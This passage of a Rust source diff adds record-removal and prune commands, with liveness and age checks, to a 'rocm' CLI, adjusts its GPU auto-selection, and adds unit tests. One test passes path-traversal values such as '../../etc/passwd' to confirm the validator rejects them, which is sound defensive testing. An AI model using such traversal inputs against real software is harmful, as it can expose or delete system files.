     }
 }
 
@@ -7349,6 +7881,636 @@ fn service_action_past_tense(tool: &str) -> &'static str {
         "stop_server" => "stopped",
         _ => "updated",
     }
+}
+
+// ---------------------------------------------------------------------------
+// Local server record removal
+// ---------------------------------------------------------------------------
+
+/// Default age gate for `rocm services prune`.
+///
+/// A record that has only just stopped is the one a user is most likely to still
+/// want: `rocm services list --all` advertises `rocm services restart <id> --yes`
+/// for exactly that record, and pruning it destroys both that affordance and the
+/// log explaining why it died. Defaulting to a day means a bulk cleanup reclaims
+/// the accumulated history without swallowing the failure the user is currently
+/// looking at. `--older-than-hours 0` opts out.
+const DEFAULT_SERVICE_PRUNE_MIN_AGE_HOURS: u64 = 24;
+
+/// The on-disk files one managed-service record owns.
+///
+/// Note `engine_state` lives *outside* `services_dir`, under
+/// `<data>/engines/<engine>/state/`, so deleting the two files in `services_dir`
+/// leaves it behind — that is how orphaned engine state accumulates today.
+///
+/// Every path is rebuilt here from [`AppPaths`] plus the *validated* id and
+/// engine, deliberately **not** read from the record's own `manifest_path` /
+/// `log_path` / `engine_state_path` fields. Those are deserialized from a JSON
+/// file under `~/.rocm` that anything can write, and this is the one code path
+/// that deletes what they name.
+#[derive(Debug, Clone)]
+struct ServiceRecordArtifacts {
+    manifest: PathBuf,
+    log: PathBuf,
+    engine_state: PathBuf,
+    endpoint_key: PathBuf,
+}
+
+impl ServiceRecordArtifacts {
+    /// Every artifact, in the order they are reported and deleted.
+    fn paths(&self) -> [&Path; 4] {
+        [
+            &self.manifest,
+            &self.log,
+            &self.engine_state,
+            &self.endpoint_key,
+        ]
+    }
+}
+
+/// Validate a manifest-supplied engine name as a single filesystem path
+/// component.
+///
+/// [`AppPaths::service_engine_state_path`] joins the engine name into a path
+/// this module deletes, so an engine of `../../..` in a hand-edited manifest
+/// would otherwise aim the removal outside `<data>/engines`. Reuses the same
+/// rules as [`validate_service_id`] — `ServiceId` is the repo's single source of
+/// truth for "safe as one path component", and nothing about those rules is
+/// specific to service ids.
+fn validate_engine_component(engine: &str) -> Result<()> {
+    rocm_core::ServiceId::new(engine).with_context(|| {
+        format!("managed service engine `{engine}` is not a safe path component")
+    })?;
+    Ok(())
+}
+
+fn service_record_artifacts(
+    paths: &AppPaths,
+    service_id: &str,
+    engine: &str,
+) -> Result<ServiceRecordArtifacts> {
+    validate_service_id(service_id)?;
+    validate_engine_component(engine)?;
+    Ok(ServiceRecordArtifacts {
+        manifest: paths.service_manifest_path(service_id),
+        log: paths.service_log_path(service_id),
+        engine_state: paths.service_engine_state_path(engine, service_id),
+        endpoint_key: endpoint_keys::endpoint_key_file_path(paths, service_id),
+    })
+}
+
+/// Delete every artifact that exists, collecting failures instead of stopping at
+/// the first one.
+///
+/// A missing file is not an error: a record whose log was already deleted by
+/// hand (the workaround this command replaces) must still be removable. An
+/// unremovable one is returned as a message rather than propagated, because
+/// `prune` walks many records and aborting mid-loop would throw away the
+/// rendered plan and the audit event covering everything already deleted in the
+/// same run — losing the record of a destructive action exactly when something
+/// went wrong.
+fn try_remove_service_record_artifacts(
+    artifacts: &ServiceRecordArtifacts,
+) -> (Vec<PathBuf>, Vec<String>) {
+    let mut removed = Vec::new();
+    let mut failures = Vec::new();
+    for path in artifacts.paths() {
+        match fs::remove_file(path) {
+            Ok(()) => removed.push(path.to_path_buf()),
+            Err(error) if error.kind() == std::io::ErrorKind::NotFound => {}
+            Err(error) => failures.push(format!("{}: {error}", path.display())),
+        }
+    }
+    (removed, failures)
+}
+
+/// Delete every artifact that exists, returning the paths actually removed.
+///
+/// The strict form, for `remove`, which owns exactly one record and has no
+/// partial progress to report: any file it could not delete is the command
+/// failing. Every artifact is still attempted first, so a single stubborn file
+/// does not strand the other three.
+fn remove_service_record_artifacts(artifacts: &ServiceRecordArtifacts) -> Result<Vec<PathBuf>> {
+    let (removed, failures) = try_remove_service_record_artifacts(artifacts);
+    if !failures.is_empty() {
+        bail!("failed to remove {}", failures.join("; "));
+    }
+    Ok(removed)
+}
+
+/// Whether a record is too alive to delete: the CLI reads it as live, *or* a
+/// process it recorded is still running.
+///
+/// The status string alone is not enough for a destructive command.
+/// `refresh_from_engine_state` adopts `failed` straight from the engine's own
+/// state file, and `refresh_managed_service_runtime_liveness` then returns early
+/// for any non-live status without ever consulting the recorded pids — so a
+/// server whose engine reported failure while its process is still up reads as
+/// removable, and deleting it takes the log and the 0600 endpoint key out from
+/// under a process that may still be serving.
+fn managed_service_record_is_in_use(record: &ManagedServiceRecord) -> bool {
+    managed_service_is_live(record)
+        || recorded_service_pids(record)
+            .iter()
+            .any(|pid| process_is_running(*pid))
+}
+
+/// Remove one non-running local server record and everything it owns.
+///
+/// Refuses a live record rather than stopping it: a removal that silently killed
+/// a serving process would be a very different action from the one the user
+/// asked for. Liveness is read from the record `load_managed_service` returns,
+/// which has already been refreshed against the engine state file and the real
+/// processes — a manifest still saying `ready` for a dead PID has demoted to
+/// `stopped` by then, and must stay removable.
+fn remove_managed_service_record(paths: &AppPaths, service_id: &str, yes: bool) -> Result<String> {
+    validate_service_id(service_id)?;
+    let record = load_managed_service(paths, service_id)?;
+    // Checked before `--yes` on purpose: for a running server "stop it first" is
+    // the actionable error, and repeating the command with --yes must not be the
+    // advice a user takes away from it.
+    if managed_service_record_is_in_use(&record) {
+        bail!(
+            "local server `{service_id}` is {} and cannot be removed while it is running.\n\nTry: rocm services stop {service_id} --yes",
+            record.status
+        );
+    }
+    if !yes {
+        bail!(
+            "Removing local server record `{service_id}` requires --yes.\n\nTry: rocm services remove {service_id} --yes"
+        );
+    }
+
+    let artifacts = service_record_artifacts(paths, &record.service_id, &record.engine)?;
+    let mut output = String::new();
+    // Printed *before* the delete, because after it there is nothing left to
+    // point at: this is the last moment the log path is useful.
+    let _ = writeln!(
+        output,
+        "Removing local server record `{service_id}` (status: {}).",
+        record.status
+    );
+    let _ = writeln!(output, "  log: {}", artifacts.log.display());
+    let _ = writeln!(
+        output,
+        "After this, `rocm services logs {service_id}` and `rocm services restart {service_id} --yes` no longer work."
+    );
+    let _ = writeln!(output);
+
+    let removed = remove_service_record_artifacts(&artifacts)?;
+    let mut report = cli_report::ActionReport::new("Local server record removed")
+        .detail("service", &record.service_id)
+        .detail("engine", &record.engine)
+        .detail("files removed", removed.len());
+    for path in &removed {
+        report = report.detail("removed", path.display());
+    }
+    let _ = write!(output, "{}", report.render());
+    Ok(output)
+}
+
+/// One record `rocm services prune` would delete.
+#[derive(Debug, Clone)]
+struct ServicePruneEntry {
+    service_id: String,
+    engine: String,
+    status: String,
+    artifacts: ServiceRecordArtifacts,
+}
+
+#[derive(Debug, Default)]
+struct ServicePrunePlan {
+    remove: Vec<ServicePruneEntry>,
+    /// Files whose record is already gone — chiefly engine state under
+    /// `<data>/engines/<engine>/state/`, which no removal path has ever swept.
+    orphans: Vec<PathBuf>,
+    /// Human-readable reasons, one per record or file left in place.
+    skipped: Vec<String>,
+    /// How many records were skipped purely because they are still running.
+    skipped_live: usize,
+    /// How many were removable in every respect but too recent. Counted apart
+    /// from `skipped` so the summary can name the flag that includes them: a
+    /// silent "nothing to do" on a host full of fresh failures reads as the
+    /// command being broken.
+    skipped_recent: usize,
+}
+
+/// Modification time of `path`, or `None` when it cannot be read.
+fn path_modified(path: &Path) -> Option<SystemTime> {
+    fs::metadata(path).ok()?.modified().ok()
+}
+
+/// Age of a modification time relative to `now`. `None` when the time is missing
+/// or in the future, which is treated as "too new to touch".
+fn age_from_modified(modified: Option<SystemTime>, now: SystemTime) -> Option<Duration> {
+    now.duration_since(modified?).ok()
+}
+
+/// Whether a modification time is old enough to prune, given a threshold.
+///
+/// Fail-closed: a time that cannot be determined is kept, except when the
+/// threshold is zero (the explicit "everything that is not running" opt-out).
+fn prunable_by_modified(modified: Option<SystemTime>, min_age: Duration, now: SystemTime) -> bool {
+    if min_age.is_zero() {
+        return true;
+    }
+    age_from_modified(modified, now).is_some_and(|age| age >= min_age)
+}
+
+/// Whether `path` is old enough to prune, given a threshold in hours.
+///
+/// Only sound for files nothing in this run rewrites. Service manifests are
+/// rewritten by [`load_managed_services`], so their times are snapshotted up
+/// front by [`service_manifest_modified_times`] and gated with
+/// [`prunable_by_modified`] instead.
+fn prunable_by_age(path: &Path, min_age: Duration, now: SystemTime) -> bool {
+    prunable_by_modified(path_modified(path), min_age, now)
+}
+
+/// Modification times of every `*.json` in the services directory, taken before
+/// anything in this run can rewrite them.
+///
+/// [`load_managed_services`] refreshes each record against the engine state and
+/// the real processes, and persists the result whenever that changes the status
+/// — which is exactly what happens the first time anything observes that a
+/// `ready`/`running`/`starting` server has died. That rewrite lands *after* the
+/// `now` the age gate compares against, so a manifest read afterwards looks
+/// newer than the run itself and the fail-closed branch keeps it forever. A host
+/// whose servers died weeks ago but were never listed since would see
+/// `rocm services prune --yes` remove nothing while reporting those records as
+/// too recent to touch.
+fn service_manifest_modified_times(paths: &AppPaths) -> HashMap<PathBuf, SystemTime> {
+    let mut times = HashMap::new();
+    let Ok(entries) = fs::read_dir(paths.services_dir()) else {
+        return times;
+    };
+    for path in entries.flatten().map(|entry| entry.path()) {
+        if path.extension().and_then(|value| value.to_str()) != Some("json") {
+            continue;
+        }
+        if let Some(modified) = path_modified(&path) {
+            times.insert(path, modified);
+        }
+    }
+    times
+}
+
+/// The age threshold one `prune` invocation runs with, in hours.
+///
+/// `--any-age` is the discoverable spelling of `--older-than-hours 0` — clap
+/// rejects the two together — so this only has to collapse the flag. It is a
+/// function rather than a line inside the dispatch `match` so a test can drive
+/// the real parsed arguments through the same mapping the command uses.
+const fn service_prune_min_age_hours(older_than_hours: u64, any_age: bool) -> u64 {
+    if any_age { 0 } else { older_than_hours }
+}
+
+fn describe_hours(hours: u64) -> String {
+    if hours == 1 {
+        "1 hour".to_owned()
+    } else {
+        format!("{hours} hours")
+    }
+}
+
+/// Files in `services_dir` and the engine state dirs that no longer belong to
+/// any record.
+///
+/// A `<id>.log` or `<id>.endpoint-key` counts as orphaned only when `<id>.json`
+/// is *absent from disk* — not merely absent from `records`. An unparseable
+/// manifest is skipped by `load_managed_services`, and treating its siblings as
+/// orphans would quietly delete the log of the one record a user most needs to
+/// investigate. The corrupt manifest itself is never removed for the same
+/// reason.
+///
+/// `services_dir` also holds `launch.lock`, which is shared by every managed
+/// launch rather than owned by one service (see
+/// [`AppPaths::managed_launch_lock_path`]). Only the three per-service
+/// extensions are considered, so the lock is never a candidate.
+fn collect_service_orphans(paths: &AppPaths, min_age: Duration, now: SystemTime) -> Vec<PathBuf> {
+    let services_dir = paths.services_dir();
+    let mut orphans = Vec::new();
+
+    let push_if_orphaned = |path: &Path, orphans: &mut Vec<PathBuf>| {
+        let Some(stem) = path.file_stem().and_then(|stem| stem.to_str()) else {
+            return;
+        };
+        if services_dir.join(format!("{stem}.json")).exists() {
+            return;
+        }
+        if prunable_by_age(path, min_age, now) {
+            orphans.push(path.to_path_buf());
+        }
+    };
+
+    if let Ok(entries) = fs::read_dir(&services_dir) {
+        for path in entries.flatten().map(|entry| entry.path()) {
+            if matches!(
+                path.extension().and_then(|value| value.to_str()),
+                Some("log" | "endpoint-key")
+            ) {
+                push_if_orphaned(&path, &mut orphans);
+            }
+        }
+    }
+
+    // `<data>/engines/<engine>/state/<id>.json`. `engines/plugins` has no
+    // `state` subdirectory, so it never yields candidates.
+    if let Ok(engines) = fs::read_dir(paths.data_dir.join("engines")) {
+        for engine_dir in engines.flatten().map(|entry| entry.path()) {
+            let Some(engine) = engine_dir.file_name().and_then(|name| name.to_str()) else {
+                continue;
+            };
+            let Ok(states) = fs::read_dir(paths.engine_state_dir(engine)) else {
+                continue;
+            };
+            for path in states.flatten().map(|entry| entry.path()) {
+                if path.extension().and_then(|value| value.to_str()) == Some("json") {
+                    push_if_orphaned(&path, &mut orphans);
+                }
+            }
+        }
+    }
+
+    orphans.sort();
+    orphans
+}
+
+fn build_service_prune_plan(
+    paths: &AppPaths,
+    min_age: Duration,
+    hours: u64,
+    now: SystemTime,
+) -> Result<ServicePrunePlan> {
+    let mut plan = ServicePrunePlan::default();
+    // Taken first, because `load_managed_services` below rewrites the manifest of
+    // every record whose status its refresh corrects — see
+    // `service_manifest_modified_times` for why reading the time afterwards makes
+    // the age gate keep exactly the long-dead records prune exists to remove.
+    let manifest_times = service_manifest_modified_times(paths);
+    // `load_managed_services` refreshes each record against the engine state and
+    // the real processes before returning it, so liveness below is read from the
+    // refreshed view, never from the manifest as it was on disk.
+    for record in load_managed_services(paths)? {
+        if managed_service_record_is_in_use(&record) {
+            plan.skipped_live += 1;
+            plan.skipped.push(format!(
+                "{} is {} — stop it first with `rocm services stop {} --yes`",
+                record.service_id, record.status, record.service_id
+            ));
+            continue;
+        }
+        let artifacts = match service_record_artifacts(paths, &record.service_id, &record.engine) {
+            Ok(artifacts) => artifacts,
+            Err(error) => {
+                plan.skipped.push(format!("{}: {error}", record.service_id));
+                continue;
+            }
+        };
+        if !prunable_by_modified(
+            manifest_times.get(&artifacts.manifest).copied(),
+            min_age,
+            now,
+        ) {
+            plan.skipped_recent += 1;
+            plan.skipped.push(format!(
+                "{} changed less than {} ago",
+                record.service_id,
+                describe_hours(hours)
+            ));
+            continue;
+        }
+        plan.remove.push(ServicePruneEntry {
+            service_id: record.service_id.clone(),
+            engine: record.engine.clone(),
+            status: record.status.clone(),
+            artifacts,
+        });
+    }
+    plan.orphans = collect_service_orphans(paths, min_age, now);
+    plan.remove
+        .sort_by(|left, right| left.service_id.cmp(&right.service_id));
+    plan.skipped.sort();
+    Ok(plan)
+}
+
+fn render_service_prune_plan(plan: &ServicePrunePlan, hours: u64, dry_run: bool) -> String {
+    let mut output = String::new();
+    let _ = writeln!(output, "Local server record review");
+    let _ = writeln!(output);
+    if hours == 0 {
+        let _ = writeln!(
+            output,
+            "Including every record that is not running, however recent."
+        );
+    } else {
+        let _ = writeln!(
+            output,
+            "Only records and files untouched for at least {}.",
+            describe_hours(hours)
+        );
+    }
+    let _ = writeln!(output);
+
+    if plan.remove.is_empty() && plan.orphans.is_empty() {
+        let _ = writeln!(output, "Nothing would be removed.");
+    }
+    if plan.skipped_recent > 0 {
+        let _ = writeln!(
+            output,
+            "{} record(s) changed less than {} ago and are kept; add --any-age to include them.",
+            plan.skipped_recent,
+            describe_hours(hours)
+        );
+    }
+    if !plan.remove.is_empty() {
+        let _ = writeln!(
+            output,
+            "{} local server record(s) would be removed:",
+            plan.remove.len()
+        );
+        for entry in &plan.remove {
+            let _ = writeln!(
+                output,
+                "  - {} (status: {}, engine: {})",
+                entry.service_id, entry.status, entry.engine
+            );
+            for path in entry.artifacts.paths() {
+                if path.exists() {
+                    let _ = writeln!(output, "      {}", path.display());
+                }
+            }
+        }
+        let _ = writeln!(output);
+        let _ = writeln!(
+            output,
+            "Their logs go with them, and `rocm services restart <service-id> --yes` stops working for them."
+        );
+    }
+    if !plan.orphans.is_empty() {
+        if !plan.remove.is_empty() {
+            let _ = writeln!(output);
+        }
+        let _ = writeln!(
+            output,
+            "{} leftover file(s) with no local server record would be removed:",
+            plan.orphans.len()
+        );
+        for path in &plan.orphans {
+            let _ = writeln!(output, "  - {}", path.display());
+        }
+    }
+    if !plan.skipped.is_empty() {
+        let _ = writeln!(output);
+        let _ = writeln!(output, "Left alone:");
+        for skipped in &plan.skipped {
+            let _ = writeln!(output, "  - {skipped}");
+        }
+    }
+    if dry_run {
+        let _ = writeln!(output);
+        // "Nothing was removed", not "nothing was changed": building the plan
+        // loads every record, and loading corrects a status that no longer
+        // matches the real processes and persists that correction. No file is
+        // deleted, which is the promise a dry run of a removal command makes.
+        let _ = writeln!(
+            output,
+            "Nothing was removed. Re-run without --dry-run to remove."
+        );
+    }
+    output
+}
+
+#[derive(Debug, Default)]
+struct ServicePruneOutcome {
+    text: String,
+    removed_records: usize,
+    removed_files: usize,
+    /// Records left in place purely because they are still running.
+    skipped_live: usize,
+    skipped_recent: usize,
+    /// Paths the run could not delete, one message each. Collected rather than
+    /// propagated so the plan still prints and the audit event is still
+    /// recorded; the caller turns a non-empty list into a failing exit.
+    failures: Vec<String>,
+}
+
+/// Carry out everything `plan` names, recording what happened in `outcome`.
+///
+/// Split out of [`prune_managed_service_records`] rather than inlined there so a
+/// test can hand it a plan entry whose record came back to life after the plan
+/// was built. That window is the only reason the liveness re-check below exists,
+/// and no test driving `prune` end to end can open it: one call builds the plan
+/// and applies it, so a record is either live for both halves or dead for both.
+fn apply_service_prune_plan(
+    paths: &AppPaths,
+    plan: &ServicePrunePlan,
+    outcome: &mut ServicePruneOutcome,
+) {
+    for entry in &plan.remove {
+        // Liveness was snapshotted while the plan was built. A
+        // `rocm services restart <id> --yes` landing in that window would have
+        // its log and 0600 endpoint key deleted out from under a live process,
+        // so re-read the record immediately before touching its files —
+        // `remove` narrows the same window by loading the record it deletes.
+        // Neither closes it: the check and the delete are not atomic either way.
+        if load_managed_service(paths, &entry.service_id)
+            .is_ok_and(|record| managed_service_record_is_in_use(&record))
+        {
+            outcome.skipped_live += 1;
+            let _ = writeln!(
+                outcome.text,
+                "  {} started again while this ran and was left alone.",
+                entry.service_id
+            );
+            continue;
+        }
+        let (removed, failures) = try_remove_service_record_artifacts(&entry.artifacts);
+        outcome.removed_files += removed.len();
+        if failures.is_empty() {
+            outcome.removed_records += 1;
+        }
+        outcome.failures.extend(failures);
+    }
+    for path in &plan.orphans {
+        match fs::remove_file(path) {
+            Ok(()) => outcome.removed_files += 1,
+            Err(error) if error.kind() == std::io::ErrorKind::NotFound => {}
+            Err(error) => outcome
+                .failures
+                .push(format!("{}: {error}", path.display())),
+        }
+    }
+}
+
+/// Bulk-remove the local server records that are no longer running.
+///
+/// Unlike [`remove_managed_service_record`] a live record is *skipped*, not an
+/// error: a bulk cleanup that aborted because one server happened to be serving
+/// would be unusable on the hosts that need it most. The count is reported so
+/// the skip is never silent.
+fn prune_managed_service_records(
+    paths: &AppPaths,
+    hours: u64,
+    dry_run: bool,
+    yes: bool,
+) -> Result<ServicePruneOutcome> {
+    if !dry_run && !yes {
+        bail!(
+            "Removing local server records requires --yes.\n\nTry: rocm services prune --dry-run\nThen: rocm services prune --yes"
+        );
+    }
+    let min_age = Duration::from_secs(hours.saturating_mul(3600));
+    let plan = build_service_prune_plan(paths, min_age, hours, SystemTime::now())?;
+    let mut outcome = ServicePruneOutcome {
+        text: render_service_prune_plan(&plan, hours, dry_run),
+        skipped_live: plan.skipped_live,
+        skipped_recent: plan.skipped_recent,
+        ..ServicePruneOutcome::default()
+    };
+    if dry_run {
+        return Ok(outcome);
+    }
+
+    apply_service_prune_plan(paths, &plan, &mut outcome);
+
+    let _ = writeln!(outcome.text);
+    let _ = write!(
+        outcome.text,
+        "{}",
+        cli_report::ActionReport::new("Local server records removed")
+            .detail("records removed", outcome.removed_records)
+            .detail("files removed", outcome.removed_files)
+            .detail("still running, left alone", outcome.skipped_live)
+            .detail("too recent, kept", outcome.skipped_recent)
+            .render()
+    );
+    // A bulk cleanup that silently keeps things is indistinguishable from one
+    // that found nothing, and the records most worth reading are exactly the
+    // ones this keeps.
+    if outcome.skipped_recent > 0 {
+        let _ = writeln!(
+            outcome.text,
+            "  Those are recent enough to still be worth reading: `rocm services logs <id>`.\n  \
+             Run `rocm services prune --any-age --yes` to remove them too."
+        );
+    }
+    if !outcome.failures.is_empty() {
+        let _ = writeln!(outcome.text);
+        let _ = writeln!(
+            outcome.text,
+            "{} file(s) could not be removed:",
+            outcome.failures.len()
+        );
+        for failure in &outcome.failures {
+            let _ = writeln!(outcome.text, "  - {failure}");
+        }
+        let _ = writeln!(
+            outcome.text,
+            "Re-running is safe: everything already removed stays removed."
+        );
+    }
+    Ok(outcome)
 }
 
 fn runtimes(command: Option<RuntimesCommand>) -> Result<()> {
@@ -14213,7 +15375,7 @@ fn run_rocm_read_only_in_process(paths: &AppPaths, args: &[String]) -> Result<St
                 || command == "--version"
                 || command == "-V" =>
         {
-            Ok(format!("rocm {}\n", env!("CARGO_PKG_VERSION")))
+            Ok(format!("rocm-cli {}\n", cli_version_string()))
         }
         [command]
             if command.eq_ignore_ascii_case("model") || command.eq_ignore_ascii_case("models") =>
@@ -20034,11 +21196,52 @@ fn select_auto_gpu_index(
     // is the space the selection is exported through, so the retained ordinals
     // are directly selectable. When the host is unprobeable (`visible` is
     // `None`) the set is left unrestricted (mask-unaware, as before).
+    //
+    // A short row set is not always a mask, though: `parse_gpu_vram_usage`
+    // drops any device entry missing `/mem_usage/used_vram/value` or
+    // `/mem_usage/total_vram/value`, so a device the lighter `list` enumeration
+    // counts can simply have no row. Taking rows-only there would shrink the
+    // candidate set for a reason that has nothing to do with visibility, and if
+    // every *reported* device is busy the terminal fallback would hand back a
+    // busy GPU while an idle, merely untelemetried one went unconsidered —
+    // exactly the "serve pinned to an occupied GPU" fault this selection exists
+    // to avoid. So the `0..count` range is unioned back in — but only where it
+    // is evidence rather than invention, which is decided by the rows, not by
+    // `visible`:
+    //
+    //   * `detected` must be `Some(n > 0)`, so `count` is the `list` device
+    //     count — an independent source asserting those ordinals exist. When it
+    //     is absent `effective_gpu_count` falls back to `rows.len()`, which is
+    //     only the rows restating their own size and confirms nothing they omit.
+    //   * every row index must be below `count`. A row at or above it is the one
+    //     available proof that the ordinal space is re-indexed or sparse rather
+    //     than dense from 0 (`[2, 3]` with `count == 2`), and that is exactly the
+    //     masked shape the rows-only construction was introduced for, so there
+    //     the rows stay authoritative. Below the count the rows are a subset of a
+    //     dense range the count already asserts, and `0..count` is no stronger an
+    //     assumption than the telemetry-less arm below already makes.
+    //
+    // Gating on `visible.is_some()` instead would have left the bug standing
+    // wherever the mask is unknown, which is not a corner: `usable_amd_gpu_indices`
+    // is `None` unconditionally off Linux, so `visible` is always `None` on
+    // Windows. The retain below still runs on top whenever a mask *is* known, so
+    // no synthesised ordinal survives that the mask contradicts.
     let mut reported: Vec<u32> = match vram {
-        Some(rows) => rows.iter().map(|row| row.index).collect(),
+        Some(rows) => {
+            let mut indices: Vec<u32> = rows.iter().map(|row| row.index).collect();
+            let count_is_independently_sourced = detected.is_some_and(|detected| detected > 0);
+            let rows_are_a_dense_range_subset =
+                indices.iter().all(|&index| (index as usize) < count);
+            if count_is_independently_sourced && rows_are_a_dense_range_subset {
+                indices.extend(0..count as u32);
+            }
+            indices
+        }
         None => (0..count as u32).collect(),
     };
     reported.sort_unstable();
+    // The union above can repeat an ordinal that both sources name.
+    reported.dedup();
     if let Some(visible) = visible {
         reported.retain(|index| visible.contains(index));
     }
@@ -20070,11 +21273,17 @@ fn select_auto_gpu_index(
         }
         // Pass 2: the non-busy GPU with the most free VRAM in absolute terms
         // (not free percentage, which can favor a smaller GPU on heterogeneous
-        // VRAM systems). No "does this ordinal have a row?" guard is needed:
-        // inside this branch every candidate came *from* a reported row, so
-        // `usage_for` is total over `candidate_indices`. It was needed when
-        // candidates were a synthetic `0..count` range, where an ordinal could
-        // be selected that telemetry had never reported.
+        // VRAM systems). `usage_for` is only *partial* over `candidate_indices` —
+        // the union above puts back ordinals the `list` count confirms but
+        // telemetry never reported — yet no "does this ordinal have a row?" guard
+        // is needed, because the comparator already orders them last: the keys are
+        // `Option<u64>`, and `None` sorts below every `Some`, including `Some(0)`.
+        // So a rowless ordinal can only be the maximum when *no* candidate has a
+        // row; then every key is `None`, every comparison falls through to the
+        // index tie-break, and the winner is the lowest candidate index — which is
+        // precisely what Pass 3 would return from an ascending `reported`. Adding
+        // the guard back would therefore change no outcome, only skip a pass that
+        // already agrees.
         if let Some(&index) = candidate_indices.iter().max_by(|left, right| {
             let left_free = usage_for(**left).map(|usage| usage.free_mb());
             let right_free = usage_for(**right).map(|usage| usage.free_mb());
@@ -26673,6 +27882,886 @@ install therock";
         Ok(())
     }
 
+    /// Plant a managed-service record plus every artifact it owns: the log and
+    /// endpoint key beside the manifest in `services_dir`, and the engine state
+    /// file under `<data>/engines/<engine>/state/`.
+    fn plant_service_record(
+        paths: &AppPaths,
+        service_id: &str,
+        status: &str,
+        supervisor_pid: u32,
+    ) -> Result<ManagedServiceRecord> {
+        let mut record = ManagedServiceRecord::new(
+            paths,
+            service_id,
+            "vllm",
+            "qwen",
+            "Qwen/Qwen3.5",
+            "127.0.0.1",
+            9,
+            "managed",
+            supervisor_pid,
+            None,
+            None,
+            Some("gpu_required".to_owned()),
+        );
+        status.clone_into(&mut record.status);
+        record.write()?;
+        fs::write(&record.log_path, "engine output\n")?;
+        fs::create_dir_all(
+            record
+                .engine_state_path
+                .parent()
+                .context("engine state path has a parent")?,
+        )?;
+        // Mirror the planted status: `refresh_from_engine_state` adopts whatever
+        // this file says, so a mismatched value would silently demote the record
+        // before the code under test ever sees it.
+        fs::write(
+            &record.engine_state_path,
+            serde_json::to_vec(&serde_json::json!({ "status": status }))?,
+        )?;
+        endpoint_keys::store_endpoint_api_key(paths, service_id, "test-key")?;
+        Ok(record)
+    }
+
+    #[test]
+    fn services_remove_deletes_every_artifact_and_leaves_the_shared_lock() -> Result<()> {
+        let (root, paths) = test_paths("services-remove-artifacts");
+        paths.ensure()?;
+        let record = plant_service_record(&paths, "svc-remove-me", "failed", 999_999_999)?;
+        // `launch.lock` lives in `services_dir` but belongs to every managed
+        // launch, not to one service. Removing a record must not touch it.
+        let lock = paths.managed_launch_lock_path();
+        fs::write(&lock, "")?;
+
+        let rendered = remove_managed_service_record(&paths, "svc-remove-me", true);
+        let rendered = match rendered {
+            Ok(text) => text,
+            Err(error) => {
+                let _ = fs::remove_dir_all(&root);
+                return Err(error);
+            }
+        };
+        let manifest_exists = record.manifest_path.exists();
+        let log_exists = record.log_path.exists();
+        let engine_state_exists = record.engine_state_path.exists();
+        let key_exists = endpoint_keys::endpoint_key_file_path(&paths, "svc-remove-me").exists();
+        let lock_exists = lock.exists();
+        let _ = fs::remove_dir_all(&root);
+
+        assert!(!manifest_exists, "the details file must be deleted");
+        assert!(!log_exists, "the log must be deleted");
+        assert!(
+            !engine_state_exists,
+            "the engine state file must be deleted — it lives outside the services folder, \
+             so deleting only the two files beside the manifest is what orphans it"
+        );
+        assert!(!key_exists, "the endpoint key file must be deleted");
+        assert!(lock_exists, "the shared launch lock must be left alone");
+        assert!(rendered.contains("Local server record removed"));
+        assert!(rendered.contains("  files removed: 4"));
+        // The log path is the last thing worth knowing before it disappears.
+        assert!(
+            rendered.contains(&format!("  log: {}", record.log_path.display())),
+            "the log path must be printed before the delete:\n{rendered}"
+        );
+        Ok(())
+    }
+
+    #[test]
+    fn services_remove_refuses_a_running_record_and_names_stop() -> Result<()> {
+        let (root, paths) = test_paths("services-remove-live");
+        paths.ensure()?;
+        // The current process is a guaranteed-live PID, so the liveness refresh
+        // keeps this record in a running state.
+        plant_service_record(&paths, "svc-live", "ready", std::process::id())?;
+
+        let error = remove_managed_service_record(&paths, "svc-live", true)
+            .expect_err("removing a running local server must fail");
+        let manifest_exists = paths.service_manifest_path("svc-live").exists();
+        let _ = fs::remove_dir_all(&root);
+
+        let message = error.to_string();
+        assert!(
+            message.contains("cannot be removed while it is running"),
+            "unexpected error: {message}"
+        );
+        assert!(
+            message.contains("rocm services stop svc-live --yes"),
+            "the error must name the stop command: {message}"
+        );
+        assert!(manifest_exists, "a refused removal must delete nothing");
+        Ok(())
+    }
+
+    /// A manifest still saying `ready` for a process that is gone is the common
+    /// case this command exists for. `load_managed_services` demotes it to
+    /// `stopped` while reading, so the live guard has to run on the refreshed
+    /// record — checking the status as it sits on disk would refuse forever.
+    #[test]
+    fn services_remove_accepts_a_stale_ready_record_that_refreshed_to_stopped() -> Result<()> {
+        let (root, paths) = test_paths("services-remove-stale-ready");
+        paths.ensure()?;
+        let record = plant_service_record(&paths, "svc-stale", "ready", 999_999_999)?;
+        assert_eq!(
+            serde_json::from_slice::<ManagedServiceRecord>(&fs::read(&record.manifest_path)?)?
+                .status,
+            "ready",
+            "premise: the manifest on disk still claims `ready`"
+        );
+
+        let result = remove_managed_service_record(&paths, "svc-stale", true);
+        let manifest_exists = record.manifest_path.exists();
+        let _ = fs::remove_dir_all(&root);
+
+        result?;
+        assert!(!manifest_exists, "the stale record must be removable");
+        Ok(())
+    }
+
+    #[test]
+    fn services_remove_requires_yes() -> Result<()> {
+        let (root, paths) = test_paths("services-remove-yes");
+        paths.ensure()?;
+        plant_service_record(&paths, "svc-needs-yes", "failed", 999_999_999)?;
+
+        let error = remove_managed_service_record(&paths, "svc-needs-yes", false)
+            .expect_err("removal without --yes must fail");
+        let manifest_exists = paths.service_manifest_path("svc-needs-yes").exists();
+        let _ = fs::remove_dir_all(&root);
+
+        let message = error.to_string();
+        assert!(message.contains("requires --yes"), "unexpected: {message}");
+        assert!(
+            message.contains("rocm services remove svc-needs-yes --yes"),
+            "unexpected: {message}"
+        );
+        assert!(manifest_exists, "a refused removal must delete nothing");
+        Ok(())
+    }
+
+    #[test]
+    fn service_record_artifacts_reject_an_engine_that_escapes_the_state_dir() -> Result<()> {
+        let (root, paths) = test_paths("services-remove-traversal");
+        paths.ensure()?;
+
+        let by_engine = service_record_artifacts(&paths, "svc-ok", "../../../etc");
+        let by_id = service_record_artifacts(&paths, "../../etc/passwd", "vllm");
+        let _ = fs::remove_dir_all(&root);
+
+        assert!(
+            by_engine.is_err(),
+            "an engine name with `..` must not reach a path this code deletes"
+        );
+        assert!(by_id.is_err(), "a traversing service id must be rejected");
+        Ok(())
+    }
+
+    #[test]
+    fn services_prune_skips_running_records_and_reports_the_count() -> Result<()> {
+        let (root, paths) = test_paths("services-prune-live");
+        paths.ensure()?;
+        plant_service_record(&paths, "svc-dead", "failed", 999_999_999)?;
+        plant_service_record(&paths, "svc-running", "ready", std::process::id())?;
+
+        let outcome = prune_managed_service_records(&paths, 0, false, true);
+        let outcome = match outcome {
